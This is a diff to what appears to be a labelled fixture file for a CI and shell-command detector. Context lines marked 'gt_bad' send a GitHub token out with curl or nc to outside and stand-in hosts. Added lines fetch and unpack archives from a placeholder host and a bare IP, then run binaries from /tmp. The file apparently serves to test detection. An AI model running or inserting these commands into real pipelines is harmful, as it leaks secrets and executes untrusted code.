@@ -53,3 +53,11 @@ gt_bad_9: run: echo ${{ secrets.GITHUB_TOKEN }} | base64 | curl -d @- https://ap
 gt_bad_10: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://${{ env.HOST }}/user
 gt_bad_11: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user; curl -d x https://example.invalid/x
 gt_bad_12: run: nc 203.0.113.5 9 <<< ${{ secrets.GITHUB_TOKEN }} # https://api.github.com/user
+sh_curl_tar: curl -sL "https://example.invalid/dist/src.tar.gz" | tar xzf -
+sh_curl_tar_ip: curl -sL http://203.0.113.9/src.tar.gz | tar xzf -
+sh_configure: ./configure --prefix="$PREFIX" && make install
+sh_chmod_libs: chmod +x ${PREFIX}/lib/{libldap,liblber}*.${suffix}*
+sh_chmod_tmp: chmod +x /tmp/tool
+sh_ci_check: if [ -z "$CI" ]; then
+sh_fi: fi
+sh_python_spawn: python3 -c "import subprocess; subprocess.run(['/tmp/x'])"
